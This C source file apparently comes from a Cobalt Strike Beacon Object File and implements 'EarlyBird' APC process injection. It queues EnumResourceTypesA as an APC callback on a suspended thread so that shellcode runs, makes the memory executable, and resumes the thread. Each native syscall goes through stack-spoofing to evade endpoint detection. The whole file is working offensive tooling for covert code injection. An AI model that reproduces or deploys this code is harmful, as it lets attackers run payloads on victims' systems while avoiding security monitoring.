/*

    - Add an APC on suspended thread pass in function args
    - Resume thread

    The APC Callback is EnumDesourceTypesA


    BOOL EnumResourceTypesA(
    [in, optional] HMODULE          hModule,
    [in]           ENUMRESTYPEPROCA lpEnumFunc,
    [in]           LONG_PTR         lParam
    );

    The shellcode addr is put in 5th arguments of function (PVOID ApcArgument2) to abuse of callback function EnumResourceTypesA for shellcode execution

*/

#include <windows.h>

#include "Prototypes.h"
#include "Beacon.h"
#include "Vulcan.h"
#include "Ntdll.h"
#include "Macros.h"
#include "Bofdefs.h"
#include "Syscalls.h"

BOOL EarlyBird(
    _In_    HANDLE  hThread,
	_In_	HANDLE	hProcess,
    _In_    PVOID   pShellcode,
    _In_    SIZE_T  dwShellcodeSize,
	_In_	DWORD	dwOffset,
	_In_	PSYNTHETIC_STACK_FRAME	stackFrame,
	_In_	PNT_FUNC				ntFunc
)
{
    NTSTATUS    status = 0;
    SIZE_T      oldProtect = 0;

    void* pEnumResourceTypesA = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "EnumResourceTypesA");

	status = SPOOF_CALL(stackFrame, ntFunc->NtQueueApcThread.pJmpAddr, ntFunc->NtQueueApcThread.wSyscall, hThread, (PPS_APC_ROUTINE)pEnumResourceTypesA, NULL, (U_PTR(pShellcode) + dwOffset), NULL);
	if (!NT_SUCCESS(status))
	{
		BeaconPrintf(CALLBACK_ERROR, "[EarlyBird Error] 0x1 ! STATUS : 0x%llx", status);
		return FALSE;
	}

	status = SPOOF_CALL(stackFrame, ntFunc->NtProtectVirtualMemory.pJmpAddr, ntFunc->NtProtectVirtualMemory.wSyscall, hProcess, &pShellcode, &dwShellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
	if(status)
	{
		BeaconPrintf(CALLBACK_ERROR, "[EarlyBird Error] 0x2 ! STATUS : 0x%llx", status);
		return FALSE;
	}

	//BeaconPrintf(CALLBACK_OUTPUT, "RW->RX");
	status = SPOOF_CALL(stackFrame, ntFunc->NtResumeThread.pJmpAddr, ntFunc->NtResumeThread.wSyscall, hThread, NULL);
	if(NT_ERROR(status))
	{
		BeaconPrintf(CALLBACK_ERROR, "[EarlyBird Error] 0x3 ! STATUS : 0x%llx", status);
		return FALSE;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "Injection success !");
    return TRUE;
}